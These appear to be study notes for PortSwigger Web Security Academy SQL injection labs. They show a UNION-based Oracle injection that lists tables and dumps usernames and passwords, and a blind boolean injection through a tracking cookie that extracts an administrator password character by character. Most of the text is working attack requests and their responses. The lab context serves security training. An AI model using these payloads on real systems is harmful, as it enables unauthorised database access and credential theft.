# SQL Injection Labs for BSCP

## SQL injection attack, listing the database contents on Oracle

Note: Oracle requires a `FROM` clause in all `SELECT` statements. We can use the
built-in `dual` table for that.

```
GET /filter?category='+UNION+SELECT+NULL,'a'+from+dual-- HTTP/2

GET /filter?category='+UNION+SELECT+NULL,table_name+FROM+all_tables-- HTTP/2
<tr>
  <td>USERS_KMHLSB</td>
</tr>

GET /filter?category='+UNION+SELECT+NULL,column_name+FROM+all_tab_columns+WHERE+table_name+=+'USERS_KMHLSB'-- HTTP/2
PASSWORD_TLPSHT
USERNAME_ZZFDXD


GET /filter?category='+UNION+SELECT+NULL,PASSWORD_TLPSHT+||+':'+||+USERNAME_ZZFDXD+FROM+USERS_KMHLSB-- HTTP/2
93w4qoy3clpolrawivuk:wiener
weq2qre17hvdxek7a4sv:carlos
zu913q61aqwqtdyrv2xo:administrator
```

## Blind SQL injection with conditional responses

```
GET /filter?category=Toys+%26+Games HTTP/2
Host: 0adf004e04ea2a9c854a78ad00360047.web-security-academy.net
Cookie: TrackingId=cQvDEyZPW0ZMMZVx; session=FnfWrUq2pwOxFm0Wrq4nyRmD9IkjPP5e

# Check if execution happens
GET /filter?category=Toys+%26+Games HTTP/2
Host: 0adf004e04ea2a9c854a78ad00360047.web-security-academy.net
Cookie: TrackingId=cQvDEyZPW0ZMMZVx' AND '3'='3; session=FnfWrUq2pwOxFm0Wrq4nyRmD9IkjPP5e

# Check fist letter
Cookie: TrackingId=cQvDEyZPW0ZMMZVx' AND SUBSTRING((SELECT password FROM Users WHERE Username = 'administrator'), 1, 1) <= 'm session=FnfWrUq2pwOxFm0Wrq4nyRmD9IkjPP5e

# First match
Cookie: TrackingId=cQvDEyZPW0ZMMZVx' AND SUBSTRING((SELECT password FROM Users WHERE Username = 'administrator'), 1, 1) = 'f; session=FnfWrUq2pwOxFm0Wrq4nyRmD9IkjPP5e

# Second Letter
Cookie: TrackingId=cQvDEyZPW0ZMMZVx' AND SUBSTRING((SELECT password FROM Users WHERE Username = 'administrator'), 2, 1) = 'a; session=FnfWrUq2pwOxFm0Wrq4nyRmD9IkjPP5e

# Third
Cookie: TrackingId=cQvDEyZPW0ZMMZVx' AND SUBSTRING((SELECT password FROM Users WHERE Username = 'administrator'), 3, 1) = '5; session=FnfWrUq2pwOxFm0Wrq4nyRmD9IkjPP5eA

# Final 
GET /filter?category=Toys+%26+Games HTTP/2
Host: 0adf004e04ea2a9c854a78ad00360047.web-security-academy.net
Cookie: TrackingId=cQvDEyZPW0ZMMZVx' AND SUBSTRING((SELECT password FROM Users WHERE Username = 'administrator'), 1, 20) = 'fa55g4p06ue320533fus; session=FnfWrUq2pwOxFm0Wrq4nyRmD9IkjPP5e
```

This could have been done way more efficiently by using the intruder feature of
BurpSuite.

